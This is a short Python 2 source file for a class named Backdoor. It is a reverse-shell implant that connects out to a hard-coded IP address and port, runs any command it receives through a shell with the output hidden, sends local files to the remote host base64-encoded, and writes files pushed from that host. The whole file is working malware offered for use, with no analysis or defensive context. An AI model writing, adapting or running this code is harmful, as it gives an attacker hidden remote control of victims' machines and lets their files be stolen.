#!user/bin/env

import socket
import subprocess
import json
import os
import base64


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def exec_sys_cmds(self, command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(command, shell=True, stdin=DEVNULL, stderr=DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "Changing working director to " + os.getcwd()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, contents):
        with open(path, "wb") as file:
            file.write(base64.b64decode(contents))
            return "[+] Upload Successfull !!!"

    def run(self):
        while True:
            try:
                command = self.reliable_recv()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1 :
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.exec_sys_cmds(command)
            except Exception as e:
                command_result = "[-] Command not executed properly !!!\n[-] Error : " + str(e)
            self.reliable_send(command_result)



connection = Backdoor("192.168.43.138", 444)
connection.run()